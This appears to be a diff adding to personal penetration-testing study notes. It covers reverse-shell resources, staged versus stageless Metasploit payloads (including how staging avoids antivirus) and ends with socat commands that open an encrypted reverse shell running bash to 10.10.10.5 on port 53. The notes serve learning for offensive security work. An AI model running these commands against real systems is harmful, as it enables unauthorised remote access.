@@ -136,3 +136,22 @@ Antak is a web shell built in ASP.Net included within the [Nishang project](http
 $ ls /usr/share/nishang 
 ```
 
+### Shell Generation and Preconfigured Links
+
+Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at `/usr/share/webshells`. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.
+
+## Staged vs Stageless
+[[MetaSploit]] [[MSFVenom]] 
+- _Staged_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task. **Look for the seperating / for staged payloads**
+- _Stageless_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener. **Look for the _ in the payload name for Stageless**
+
+
+### **Socat OpenSSL Help**
+```
+socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:/bin/bash
+
+socat OPENSSL::10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
